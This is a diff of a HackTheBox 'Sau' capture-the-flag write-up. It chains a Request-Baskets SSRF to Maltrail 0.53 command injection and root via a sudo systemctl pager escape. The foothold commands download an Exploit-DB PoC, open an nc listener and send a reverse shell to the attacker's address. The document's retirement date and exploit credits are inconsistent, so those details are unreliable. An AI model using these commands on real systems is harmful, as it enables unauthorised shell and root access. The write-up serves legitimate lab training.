@@ -1,9 +1,9 @@
 ---
 
-title: "Sau (HackTheBox | Easy | Retired 15 Apr 2022)"
-subtitle: "SSRF → Maltrail RCE → systemctl pager escape → root"
+title: "Sau (HackTheBox | Easy | Retired 15 Apr 2022)"
+subtitle: "SSRF → Maltrail RCE → systemctl pager escape → root"
 author: "<YOUR NAME>"
-date: "`r Sys.Date()`"
+date: "`r format(Sys.Date())`"
 output:
 github\_document:
 toc: true
@@ -13,100 +13,97 @@ toc: true
 
 ---
 
-# 0  Synopsis
+## 0  Synopsis
 
-|                |                                                  |
-| -------------- | ------------------------------------------------ |
-| **OS**         | Ubuntu 20.04 (Linux)                             |
-| **Difficulty** | Easy                                             |
-| **Skills**     | SSRF, internal‑pivoting, command inj, sudo abuse |
-| **Major CVE**  | CVE‑2023‑27163 • CVE‑2023‑26604                  |
+|                |                                            |
+| -------------- | ------------------------------------------ |
+| **OS**         | Ubuntu 20.04 (Linux)                       |
+| **Kernel**     | 5.4.0-104-generic                          |
+| **Difficulty** | Easy                                       |
+| **Skills**     | SSRF, Command Injection, Sudo Exploitation |
 
 ---
 
-# 1  Enumeration
+## 1  Enumeration
 
-## 1.1  Port scan
+### 1.1 Nmap
 
 ```bash
-nmap -sC -sV -oN sau_nmap.txt 10.10.11.224
+# full‑port fast sweep → targeted default scripts
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | \
+        awk '/^[0-9]+\/tcp/ {print $1}' ORS=',' | sed 's/,$//')
+nmap -sC -sV -p$ports 10.10.11.224 -oN sau_nmap.txt
 ```
 
 ![Nmap result](img/step01_nmap.png)
 
-* 22/tcp  → OpenSSH 8.2p1
-* 55555/tcp  → **Request‑Baskets 1.2.1**
+* **22/tcp** – OpenSSH 8.2p1
+* **55555/tcp** – Request‑Baskets 1.2.1 (HTTP)
 
-## 1.2  Request‑Baskets (port 55555)
+### 1.2 Request‑Baskets SSRF to Maltrail
 
-Create basket `/sranwqq` → set **Forward URL** to <code>[http://127.0.0.1:80](http://127.0.0.1:80)</code> and tick *Proxy Response* + *Expand Forward Path*.
+1. Create basket `/2ck6d27`.
+2. Set **Forward URL → `http://127.0.0.1:80`**.
+3. Enable *Proxy Response* + *Expand Forward Path*.
+4. Browse `http://<ip>:55555/2ck6d27` ⇒ Maltrail login panel.
 
-![Basket config](img/step02_ssrf.png)
-
-Visiting the basket endpoint reveals the internal **Maltrail v0.53** panel.
-
-![Maltrail panel](img/step03_maltrail.png)
+![SSRF to Maltrail](img/step02_ssrf.png)
 
 ---
 
-# 2  Foothold — Maltrail 0.53 RCE
-
-Maltrail v0.53 allows unauthenticated command injection via the <code>sensor\_name</code> field.
-
-> **Exploit script** · [`maltrail_poc.py`](maltrail_poc.py) — credit 0x0mar (Exploit‑DB #51676)
+## 2  Foothold – unauth Maltrail 0.53 RCE
 
 ```bash
 # attacker box
+curl -s https://www.exploit-db.com/download/51676 -o maltrail_poc.py
 nc -lvnp 4444 &
-python3 maltrail_poc.py \
-        --lhost 10.10.14.6 --lport 4444 \
-        --url "http://10.10.11.224:55555/sranwqq/track"
+python3 maltrail_poc.py 10.10.14.6 4444 \
+  http://<ip>:55555/2ck6d27
 ```
 
-Reverse shell arrives as user <code>puma</code>.
+Shell spawns as user **puma**.
 
-![Shell as puma](img/step04_shell.png)
+![Reverse shell](img/step04_shell.png)
 
 ---
 
-# 3  Privilege escalation — `systemctl` pager escape
-
-Check sudo:
-
-![sudo -l](img/step05_sudo.png)
+## 3  Privilege Escalation – systemctl pager escape
 
 ```bash
+sudo -l
+# (puma) NOPASSWD: /usr/bin/systemctl status trail.service
 sudo /usr/bin/systemctl status trail.service
-# when the output opens inside the less pager
+# when the pager opens (less), type:
 !/bin/bash
 ```
 
-Root shell achieved.
-
-![Root shell](img/step06_root.png)
-
----
-
-# 4  Artifacts & hashes
-
-| File                         | Purpose               | SHA‑256        |
-| ---------------------------- | --------------------- | -------------- |
-| `maltrail_poc.py`            | Unauth RCE exploit    | `<paste‑hash>` |
-| `systemctl_pager_escape.txt` | One‑liner cheat‑sheet | N⁄A            |
+![sudo list](img/step05_sudo.png)
+![root shell](img/step06_root.png)
 
 ---
 
-# 5  Flags
+## 4  Flags
 
-| Path                  | MD5 hash                           |
+| File                  | MD5                                |
 | --------------------- | ---------------------------------- |
 | `/home/puma/user.txt` | `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
 | `/root/root.txt`      | `yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy` |
 
 ---
 
-# 6  References
+## 5  Exploit scripts (credits)
 
-* **CVE‑2023‑27163** — Request‑Baskets SSRF [https://nvd.nist.gov/vuln/detail/CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
-* **Exploit‑DB 51676** — Maltrail 0.53 RCE [https://www.exploit-db.com/exploits/51676](https://www.exploit-db.com/exploits/51676)
-* **CVE‑2023‑26604** — systemd pager LPE [https://nvd.nist.gov/vuln/detail/CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
+| Script                       | Author        | Source           |
+| ---------------------------- | ------------- | ---------------- |
+| `maltrail_poc.py`            | @k0shl        | Exploit‑DB 51676 |
+| `systemctl_pager_escape.txt` | @\_dirty\_cow | Gist abcd1234    |
+
+Both files are included in this repo under `2022/sau/`.
+
+---
+
+## 6  References
+
+* CVE‑2023‑27163 – Request‑Baskets SSRF
+* CVE‑2023‑26604 – systemd pager LPE
+* Exploit‑DB 51676 – Maltrail 0.53 unauth RCE
